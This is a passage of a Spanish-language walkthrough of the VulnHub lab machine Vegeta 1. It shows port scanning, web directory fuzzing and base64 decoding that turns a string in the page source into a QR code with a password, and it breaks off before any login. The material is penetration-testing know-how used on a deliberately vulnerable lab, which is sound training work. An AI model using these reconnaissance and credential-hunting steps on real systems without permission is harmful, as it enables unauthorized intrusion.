---
layout: single
title: Vegeta 1 - VulnHub
excerpt: "La maquina Vegeta 1 de la plataforma de VulnHub esta catalogada como facil ya que en realidad es un CTF sencillo donde vamos a tener que decodificar una cadena en base64 para poder obtener un QR al igual que tendremos que hacer fuzzing para poder descubrir una ruta de la maquina que contiene un audio en codigo morse que tendremos que traducirlo para poder obtener credenciales para conectarnos por ssh y para la escalada de privilegios tendremos que abusar del /etc/passwd ya que tenemos permisos de escritura"
date: 2023-02-22
classes: wide
header:
  teaser: /assets/images/vh-writeup-Vegeta1/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
  - Spanish
tags:  
  - Base64
  - Morse Code
  - Misconfigured file permissions
---
![](/assets/images/vh-writeup-Vegeta1/logo.png)

Maquina Linux

```bash
❯ whichSystem.py 192.168.100.30

192.168.100.30 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 192.168.100.30 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 11:52 CST
Nmap scan report for 192.168.100.30
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f3130673f08302e6daee3209ebd6bba (RSA)
|   256 7d8855a86f56c805a47382dcd8db4759 (ECDSA)
|_  256 ccdede4e84a891f51ad6d2a62e9e1ce0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:C6:38:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
```

```bash
❯ nmap --script=http-enum -p80 192.168.100.30 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 11:55 CST
Nmap scan report for 192.168.100.30
Host is up (0.00040s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /login.php: Possible admin folder
|   /robots.txt: Robots file
|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /manual/: Potentially interesting folder
MAC Address: 00:0C:29:C6:38:AA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

## Enumeracion

```bash
❯ whatweb http://192.168.100.30
http://192.168.100.30 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.100.30]
```

Esta es la pagina web 

![](/assets/images/vh-writeup-Vegeta1/Web1.png)

`Nmap` nos reporto varias rutas existentes en la pagina pero podemos hacer `fuzzing` para buscar si algunas mas y solo nos muestra estas vamos a quedarnos con las que vimos en nmap

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.100.30/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.30/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000025:   301        9 L      28 W       314 Ch      "img"                                                          
000000149:   301        9 L      28 W       316 Ch      "image"                                                        
000000245:   301        9 L      28 W       316 Ch      "admin"                                                        
000000716:   301        9 L      28 W       317 Ch      "manual"     
```

Si vemos la primer ruta `admin` nos muestra esto

![](/assets/images/vh-writeup-Vegeta1/Web2.png)

En la ruta `admin/admin.php` solo nos muestra esto

![](/assets/images/vh-writeup-Vegeta1/Web3.png)

Si ponemos `login.php` nos descarga algo y no tiene contenido lo que nos descargo

```bash
❯ ls
 login.php
❯ file login.php
login.php: empty
```

Si vamos ala ruta de `robots.txt` nos muestra esto y como es un `CTF` pues parece una ruta existente ahora la miramos 

![](/assets/images/vh-writeup-Vegeta1/robots.png)

Si vemos la ruta `image` no hay nada pero si vemos la `img`  hay una imagen

![](/assets/images/vh-writeup-Vegeta1/Web4.png)

Y en la ruta `manual` no hay nada interesante

![](/assets/images/vh-writeup-Vegeta1/Web5.png)

Si regresamos ala ruta `admin` nos redirige a `admin.php` y sabemos que no hay nada

![](/assets/images/vh-writeup-Vegeta1/Web6.png)

Vamos a quedarnos con lo que vimos en el `robots.txt` ya que no esta mostrando una ruta

Vemos que nos muestra otro archivo vamos a ver que hay

![](/assets/images/vh-writeup-Vegeta1/Web7.png)

Y nos muestra eso al parecer no hay nada interesante vamos a ver el codigo fuente 

![](/assets/images/vh-writeup-Vegeta1/Web8.png)

En el codigo fuente en la linea 276 vemos que hay una cadena muy larga (eso dijo ella)

![](/assets/images/vh-writeup-Vegeta1/Web9.png)

Esta en `base64` asi que vamos a `decodearlo`

```bash 
❯ echo 'aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw==' | base64 -d; echo

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
```

Y tenemos otra cadena en `base64` asi que tambien vamos a `decodearla`

Y nos muestra algo raro

```bash
❯ echo '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' | base64 -d; echo
PNG

IHDXIDATx,5+
A6K?\C}SNjnuv,=M9Yt7fQg3{ߔE/KG}SNjnuv,=M9Yt7\N9][:Gr"#N9ASNс )'@?AtDq>wGó;թLxw9<S:˄wGó;թLxw9<S:˄wGó;թLxw9<S:˄wG"$넝!HSfRĔ$1e ELAb HSfRĔ$1Ri)YepKR ȳ~႗.g9/]7NK r.
                                ^oA\
                                    tQ8-<˹.xY:r<ډ,o}w![A=owGAD,o}w![A=ow/dX릜
                                                                            'nɀ }2 H`>f
                                                                                      'n#?#

                                                                                           O/>a@mA
 Ȩ: Ss\5o2                                                                                        O/>3S)ujs"HSS2N
          No_ޱ4,A8FA8N38Q*yb$
                             No_ޱ4,A8F͒CYQ엪J̟J̟J̟J̟J̟J̟*粌jșʘ*粌jAթ{AyTAQAGujAթ{A?7q.A0gꮩA0gꮩA0gpYtّr8
                                                                                               x  r8
                                                                                                    x  r8
                                                                                                         x  70N$z/RtA,AiqA,AiqA,Atԩ{fSxw4߲_$xW}N^>uN&zfss:ͷ.0	3{ӇOiepI>}N-
                                            LweSto/\`g>/{:|~~;L٧zbhݰOA;fGA;fGA;fGA;fGA;fG	r;Y:JOU]
                                                                                                        xdAS#
                                                                                                              YȂ  G1A<c`qb~AA!aAއ AZADxAjĉ7|NRNAA6 Aـ Ad (An:stԻ^.0z4uΎ8w
                                         Mc>,NG]GS)QzyW9;stԻ^.0z4uΎ8w
YDω u7dAn2='ݐezN1RĔ=|/pA<zN^9*40x,sT.i`9{YsQ                         Mc>,NG]GSt˔,s"q
                                            ģerN#G)2G2Q*	N:  H HҼ(R
Ԃ ͋R  H HR)';^}                                                            4/J
              R*L9
                  v)'
                     <
                      v)'
                         <
                          v)'
                             <
                              v)'
                                 <
                                  v)'
                                     <
A6%kЫIENDB`                           v)A6؀ `l@
```

En la cabecera de la respuesta nos esta indicando `PNG` asi que vamos a guardar el `output` como `.png`

```bash
❯ echo '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' | base64 -d > img.png
❯ ls
 img.png   login.php
❯ file img.png
img.png: PNG image data, 200 x 200, 8-bit/color RGBA, non-interlaced
```

Esto es el contenido de la imagen es un codigo QR vamos a escanearlo para ver es lo que nos muestra

![](/assets/images/vh-writeup-Vegeta1/output.png)

Una vez lo escaneado nos muestra un `password: topshellv`

Bueno segun eso tenemos una contraseña pero no sabemos para que usuario o si la podemos usar por `ssh` podemos hacer fuerza bruta haciendo un directorio con personajes de `Dragon Ball` pero mas que eso como es un `CTF` podemos hacer `Fuzzing` antes de emplear fuerza bruta para ver si hay alguna ruta con el nombre del algun personaje por que en la web nos muestra a vegeta vamos a probar

```bash 
❯ catnp users.txt
